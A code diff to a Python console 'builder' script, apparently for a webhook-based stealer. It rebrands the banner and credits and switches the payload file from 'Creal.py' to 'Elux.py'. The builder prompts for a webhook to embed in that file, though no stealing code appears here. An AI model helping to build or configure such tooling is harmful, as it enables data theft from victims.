@@ -9,13 +9,12 @@ os.system('clear' if os.name == 'posix' else 'cls')
 
 intro = """
 
- ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
-█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
-▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
-  █       ▄▀    █    █    ▌   ▄▀   █     █       
- ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
-█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
-▐                   ▐                  ▐         
+___________.__                   
+\_   _____/|  |   __ __ ___  ___ 
+ |    __)_ |  |  |  |  \\  \/  / 
+ |        \|  |__|  |  / >    <  Made by Egg#2583 & Trep#0001
+/_______  /|____/|____/ /__/\_ \ 
+        \/                    \/ 
 
                 > Press Enter                                         
 
@@ -26,15 +25,14 @@ Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interva
 
 print(f"""{Fore.LIGHTRED_EX}
 
- ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
-█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
-▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
-  █       ▄▀    █    █    ▌   ▄▀   █     █       
- ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
-█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
-▐                   ▐                  ▐    
+___________.__                   
+\_   _____/|  |   __ __ ___  ___ 
+ |    __)_ |  |  |  |  \\  \/  / 
+ |        \|  |__|  |  / >    <  Made by Egg#2583 & Trep#0001
+/_______  /|____/|____/ /__/\_ \ 
+        \/                    \/ 
 
-            Welcome to builder
+            Welcome to the Elux builder
 
 """)
 
@@ -54,7 +52,7 @@ while True:
         os.system("cls || clear")
         webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
-        filename = "Creal.py"
+        filename = "Elux.py"
         filepath = os.path.join(os.getcwd(), filename)
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
